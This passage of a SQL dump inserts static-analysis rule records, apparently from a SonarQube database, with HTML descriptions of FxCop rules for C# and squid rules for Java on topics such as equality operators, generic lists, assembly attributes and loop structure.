                {rule:fxcop:DoNotDeclareVisibleInstanceFields}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182318.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182318.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812365, 1510817812365, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (473, 'CA1900: Value type fields should be portable', 'ValueTypeFieldsShouldBePortable', 'CA1900', 'fxcop', '<h2>Cause</h2>
<p>
            This rule checks that structures that are declared with explicit layout will align correctly when marshaled to unmanaged code on 64-bit operating systems. IA-64 does not allow unaligned memory accesses and the process will crash if this violation is not fixed.
</p>
<h2>Rule Description</h2>
<p>
            Structures that have explicit layout that contains misaligned fields cause crashes on 64-bit operating systems.
</p>
<h2>How to Fix Violations</h2>
<p>
            All fields that are smaller than 8 bytes must have offsets that are a multiple of their size, and fields that are 8 bytes or more must have offsets that are a multiple of 8. Another solution is to use <code>LayoutKind.Sequential</code> instead of <code>LayoutKind.Explicit</code>, if reasonable.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            This warning should be suppressed only if it occurs in error.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182285.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182285.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812366, 1510817812366, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (474, 'CA2231: Overload operator equals on overriding ValueType.Equals', 'OverloadOperatorEqualsOnOverridingValueTypeEquals', 'CA2231', 'fxcop', '<h2>Cause</h2>
<p>
            A value type overrides <code>Object.Equals</code> but does not implement the equality operator.
</p>
<h2>Rule Description</h2>
<p>
            In most programming languages there is no default implementation of the equality operator (==) for value types. If your programming language supports operator overloads, you should consider implementing the equality operator. Its behavior should be identical to that of <code>Equals</code>.
            You cannot use the default equality operator in an overloaded implementation of the equality operator. Doing so will cause a stack overflow. To implement the equality operator, use the Object.Equals method in your implementation. For example:









            <pre>
If (Object.ReferenceEquals(left, Nothing)) Then
    Return Object.ReferenceEquals(right, Nothing)
Else
    Return left.Equals(right)
End If
</pre>














            <pre>
if (Object.ReferenceEquals(left, null))
    return Object.ReferenceEquals(right, null);
return left.Equals(right);
</pre>











                How to Fix Violations





</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule; however, we recommend that you provide the equality operator if possible.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>




                {rule:fxcop:OperatorOverloadsHaveNamedAlternates}<br/>




                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}<br/>




                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>




                {rule:fxcop:OverrideGetHashCodeOnOverridingEquals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182359.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182359.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812367, 1510817812367, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (475, 'CA1500: Variable names should not match field names', 'VariableNamesShouldNotMatchFieldNames', 'CA1500', 'fxcop', '<h2>Cause</h2>
<p>
            An instance method declares a parameter or a local variable whose name matches an instance field of the declaring type. To catch local variables that violate the rule, the tested assembly must be built by using debugging information and the associated program database (.pdb) file must be available.
</p>
<h2>Rule Description</h2>
<p>
            When the name of an instance field matches a parameter or a local variable name, the instance field is accessed by using the <code>this</code> (<code>Me</code> in Visual Basic) keyword when inside the method body. When maintaining code, it is easy to forget this difference and assume that the parameter/local variable refers to the instance field, which leads to errors. This is true especially for lengthy method bodies.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, rename either the parameter/variable or the field.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182216.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182216.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812368, 1510817812369, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (476, 'CA1002: Do not expose generic lists', 'DoNotExposeGenericLists', 'CA1002', 'fxcop', '<h2>Cause</h2>
<p>
            A type contains an externally visible member that is a <code>System.Collections.Generic.List&lt;T&gt;</code> type, returns a <code>System.Collections.Generic.List&lt;T&gt;</code> type, or whose signature includes a <code>System.Collections.Generic.List&lt;T&gt;</code> parameter.
</p>
<h2>Rule Description</h2>
<p>


                <code>System.Collections.Generic.List&lt;T&gt;</code>
               is a generic collection that is designed for performance and not inheritance. <code>System.Collections.Generic.List&lt;T&gt;</code> does not contain virtual members that make it easier to change the behavior of an inherited class. The following generic collections are designed for inheritance and should be exposed instead of <code>System.Collections.Generic.List&lt;T&gt;</code>.
            <ul>
              <li>


                    System.Collections.ObjectModel.Collection&lt;T&gt;


              </li>
              <li>


                    System.Collections.ObjectModel.ReadOnlyCollection&lt;T&gt;


              </li>
              <li>


                    System.Collections.ObjectModel.KeyedCollection&lt;TKey, TItem&gt;


              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the <code>System.Collections.Generic.List&lt;T&gt;</code> type to one of the generic collections that is designed for inheritance.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule unless the assembly that raises this warning is not meant to be a reusable library. For example, it would be safe to suppress this warning in a performance tuned application where a performance benefit was gained from the use of generic lists.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>




                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>




                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>




                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>




                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>




                {rule:fxcop:UseGenericEventHandlerInstances}<br/>




                {rule:fxcop:UseGenericsWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182142.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182142.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812369, 1510817812370, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (477, 'CA2217: Do not mark enums with FlagsAttribute', 'DoNotMarkEnumsWithFlags', 'CA2217', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible enumeration is marked with <code>FlagsAttribute</code> and it has one or more values that are not powers of two or a combination of the other defined values on the enumeration.
</p>
<h2>Rule Description</h2>
<p>
            An enumeration should have <code>FlagsAttribute</code> present only if each value defined in the enumeration is a power of two, or a combination of defined values.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove <code>FlagsAttribute</code> from the enumeration.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:MarkEnumsWithFlags}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182335.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182335.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812371, 1510817812372, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (478, 'CA1011: Consider passing base types as parameters', 'ConsiderPassingBaseTypesAsParameters', 'CA1011', 'fxcop', '<h2>Cause</h2>
<p>
            A method declaration includes a formal parameter that is a derived type, and the method calls only members of the base type of the parameter.
</p>
<h2>Rule Description</h2>
<p>
            When a base type is specified as a parameter in a method declaration, any type that is derived from the base type can be passed as the corresponding argument to the method. When the argument is used inside the method body, the specific method that is executed depends on the type of the argument. If the additional functionality that is provided by the derived type is not required, use of the base type allows wider use of the method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the type of the parameter to its base type.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule
            <ul>
              <li>
                if the method requires the specific functionality that is provided by the derived type
                - or -
              </li>
              <li>
                to enforce that only the derived type, or a more derived type, is passed to the method.
              </li>
            </ul>
            In these cases, the code will be more robust because of the strong type checking that is provided by the compiler and runtime.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:MembersShouldNotExposeCertainConcreteTypes}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/3hk32yyz.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/3hk32yyz.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812372, 1510817812373, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (479, 'CA1824: Mark assemblies with NeutralResourcesLanguageAttribute', 'MarkAssembliesWithNeutralResourcesLanguage', 'CA1824', 'fxcop', '<h2>Cause</h2>
<p>
            An assembly contains a ResX-based resource but does not have the <code>System.Resources.NeutralResourcesLanguageAttribute</code> applied to it.
</p>
<h2>Rule Description</h2>
<p>
            The NeutralResourcesLanguage attribute informs the ResourceManager of the language that was used to display the resources of the neutral culture for an assembly. When it looks up resources in the same culture as the neutral resources language, the ResourceManager automatically uses the resources that are located in the main assembly. It does this instead of searching for a satellite assembly that has the current user interface culture for the current thread. This improves lookup performance for the first resource that you load and can reduce your working set.
</p>
<h2>Fixing Violations</h2>
<p>
            To fix a violation of this rule, add the attribute to the assembly, and specify the language of the resources of the neutral culture.
</p>
<h2>Specifying the Language</h2>
<p>
            To specify the language of the resource of the neutral culture


                <li>
                  In Solution Explorer, right-click your project, and then Click Properties.
                </li>
                <li>
                  From the left navigation bar select Application, and then click Assembly Information.
                </li>
                <li>
                  In the Assembly Information dialog box, select the language from the Neutral Language drop-down list.
                </li>
                <li>
                  Click OK.
                </li>


</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is permissible to suppress a warning from this rule. However, startup performance might decrease.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb385967.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb385967.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812374, 1510817812374, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (480, 'CA2123: Override link demands should be identical to base', 'OverrideLinkDemandsShouldBeIdenticalToBase', 'CA2123', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected method in a public type overrides a method or implements an interface, and does not have the same Link Demands as the interface or virtual method.
</p>
<h2>Rule Description</h2>
<p>
            This rule matches a method to its base method, which is either an interface or a virtual method in another type, and then compares the link demands on each. A violation is reported if either the method or the base method has a link demand and the other does not.
            If this rule is violated, a malicious caller can bypass the link demand merely by calling the unsecured method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, apply the same link demand to the overide method or implementation. If this is not possible, mark the method with a full demand or remove the attribute altogether.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182305.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182305.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812375, 1510817812375, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (761, 'Silly math should not be performed', 'S2185', NULL, 'squid', '<p>Certain math operations are just silly and should not be performed because their results are predictable.</p>
<p>In particular, <code>anyValue % 1</code> is silly because it will always return 0.</p>
<p>Casting a non-floating-point value to floating-point and then passing it to <code>Math.round</code>, <code>Math.ceil</code>, or
<code>Math.floor</code> is silly because the result will always be the original value. </p>
<p>These operations are silly with any constant value: <code>Math.abs</code>, <code>Math.ceil</code>, <code>Math.floor</code>, <code>Math.rint</code>,
<code>Math.round</code>.</p>
<p>And these oprations are silly with certain constant values:</p>
<table>
  <tbody>
    <tr>
      <th>Operation</th>
      <th>Value</th>
    </tr>
    <tr>
      <td>acos</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>asin</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>atan</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>atan2</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>cbrt</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>cos</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>cosh</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>exp</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>expm1</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>log</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>log10</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>sin</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>sinh</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>sqrt</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>tan</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>tanh</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>toDegrees</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>toRadians</td>
      <td>0.0</td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
public void doMath(int a) {
  double floor = Math.floor((double)a); // Noncompliant
  double ceiling = Math.ceil(4.2);  // Noncompliant
  double arcTan = Math.atan(0.0);  // Noncompliant
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812767, 1510817812767, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (773, 'Abstract methods should not be redundant', 'S3038', NULL, 'squid', '<p>There''s no point in redundantly defining an <code>abstract</code> method with the same signature as a method in an <code>interface</code> that the
class <code>implements</code>. Any concrete child classes will have to implement the method either way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface Reportable {
  String getReport();
}

public abstract class AbstractRuleReport implements Reportable{
  public abstract String getReport();  // Noncompliant

  // ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'confusing', false, 'HTML', 1510817812782, 1510817812782, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (481, 'CA1016: Mark assemblies with AssemblyVersionAttribute', 'MarkAssembliesWithAssemblyVersion', 'CA1016', 'fxcop', '<h2>Cause</h2>
<p>
            The assembly does not have a version number.
</p>
<h2>Rule Description</h2>
<p>
            The identity of an assembly is composed of the following information:
            <ul>
              <li>
                Assembly name
              </li>
              <li>
                Version number
              </li>
              <li>
                Culture
              </li>
              <li>
                Public key (for strongly named assemblies).
              </li>
            </ul>
            The .NET Framework uses the version number to uniquely identify an assembly, and to bind to types in strongly named assemblies. The version number is used together with version and publisher policy. By default, applications run only with the assembly version with which they were built.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add a version number to the assembly by using the <code>System.Reflection.AssemblyVersionAttribute</code> attribute. See the following example.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule for assemblies that are used by third parties, or in a production environment.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182155.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182155.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812376, 1510817812377, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (482, 'CA2002: Do not lock on objects with weak identity', 'DoNotLockOnObjectsWithWeakIdentity', 'CA2002', 'fxcop', '<h2>Cause</h2>
<p>
            A thread attempts to acquire a lock on an object that has a weak identity.
</p>
<h2>Rule Description</h2>
<p>
            An object is said to have a weak identity when it can be directly accessed across application domain boundaries. A thread that tries to acquire a lock on an object that has a weak identity can be blocked by a second thread in a different application domain that has a lock on the same object. The following types have a weak identity and are flagged by the rule:
            <ul>
              <li>


                    <code>MarshalByRefObject</code>


              </li>
              <li>


                    <code>ExecutionEngineException</code>


              </li>
              <li>


                    <code>OutOfMemoryException</code>


              </li>
              <li>


                    <code>StackOverflowException</code>


              </li>
              <li>


                    <code>String</code>


              </li>
              <li>


                    <code>MemberInfo</code>


              </li>
              <li>


                    <code>ParameterInfo</code>


              </li>
              <li>


                    <code>Thread</code>


              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, use an object from a type that is not in the list in the Description section.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:DisposableFieldsShouldBeDisposed}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182290.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182290.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '15min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812377, 1510817812378, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (774, 'Methods should not have too many lines', 'S138', NULL, 'squid', '<p>A method that grows too large tends to aggregate too many responsibilities. Such method inevitably become harder to understand and therefore harder
to maintain.</p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller methods which focus on well-defined tasks. Those smaller methods will
not only be easier to understand, but also probably easier to test.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812783, 1510817812783, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (775, 'Loops should not contain more than a single "break" or "continue" statement', 'S135', NULL, 'squid', '<p>Restricting the number of <code>break</code> and <code>continue</code> statements in a loop is done in the interest of good structured programming.
</p>
<p>One <code>break</code> and <code>continue</code> statement is acceptable in a loop, since it facilitates optimal coding. If there is more than one,
the code should be refactored to increase readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 1; i &lt;= 10; i++) {     // Noncompliant - 2 continue - one might be tempted to add some logic in between
  if (i % 2 == 0) {
    continue;
  }

  if (i % 3 == 0) {
    continue;
  }

  System.out.println("i = " + i);
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '20min', NULL, NULL, 'per extra ["break" or "continue"|"CONTINUE", "EXIT", "CHECK"] statement', NULL, 'brain-overload', false, 'HTML', 1510817812785, 1510817812785, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (778, '"Object.wait(...)" should never be called on objects that implement "java.util.concurrent.locks.Condition"', 'S1844', NULL, 'squid', '<p>From the Java API documentation:</p>
<blockquote>
  <p><code>Condition</code> factors out the <code>Object</code> monitor methods (<code>wait</code>, <code>notify</code> and <code>notifyAll</code>)
  into distinct objects to give the effect of having multiple wait-sets per object, by combining them with the use of arbitrary Lock implementations.
  Where a <code>Lock</code> replaces the use of <code>synchronized</code> methods and statements, a <code>Condition</code> replaces the use of the
  <code>Object</code> monitor methods.</p>
</blockquote>
<p>The purpose of implementing the <code>Condition</code> interface is to gain access to its more nuanced <code>await</code> methods. Therefore,
calling the method <code>Object.wait(...)</code> on a class implementing the <code>Condition</code> interface is silly and confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
final Lock lock = new ReentrantLock();
final Condition notFull  = lock.newCondition();
...
notFull.wait();
</pre>
<h2>Compliant Solution</h2>
<pre>
final Lock lock = new ReentrantLock();
final Condition notFull  = lock.newCondition();
...
notFull.await();
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812789, 1510817812789, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (483, 'CA2226: Operators should have symmetrical overloads', 'OperatorsShouldHaveSymmetricalOverloads', 'CA2226', 'fxcop', '<h2>Cause</h2>
<p>
            A type implements the equality or inequality operator and does not implement the opposite operator.
</p>
<h2>Rule Description</h2>
<p>
            There are no circumstances where either equality or inequality is applicable to instances of a type, and the opposite operator is undefined. Types typically implement the inequality operator by returning the negated value of the equality operator.
            The C# compiler issues an error for violations of this rule.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement both the equality and inequality operators, or remove the one that is present.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Your type will not work in a manner that is consistent with the .NET Framework.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>




                {rule:fxcop:OperatorOverloadsHaveNamedAlternates}<br/>




                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>




                {rule:fxcop:OverrideGetHashCodeOnOverridingEquals}<br/>




                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182356.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182356.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812378, 1510817812379, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (484, 'CA1007: Use generics where appropriate', 'UseGenericsWhereAppropriate', 'CA1007', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible method contains a reference parameter of type <code>System.Object</code>, and the containing assembly targets .NET Framework 2.0.
</p>
<h2>Rule Description</h2>
<p>
            A reference parameter is a parameter that is modified by using the <code>ref</code> (<code>ByRef</code> in Visual Basic) keyword. The argument type that is supplied for a reference parameter must exactly match the reference parameter type. To use a type that is derived from the reference parameter type, the type must first be cast and assigned to a variable of the reference parameter type. Use of a generic method allows all types, subject to constraints, to be passed to the method without first casting the type to the reference parameter type.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, make the method generic and replace the <code>Object</code> parameter by using a type parameter.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>




                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>




                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>




                {rule:fxcop:DoNotExposeGenericLists}<br/>




                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>




                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>




                {rule:fxcop:UseGenericEventHandlerInstances}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182179.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182179.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812380, 1510817812380, 1);
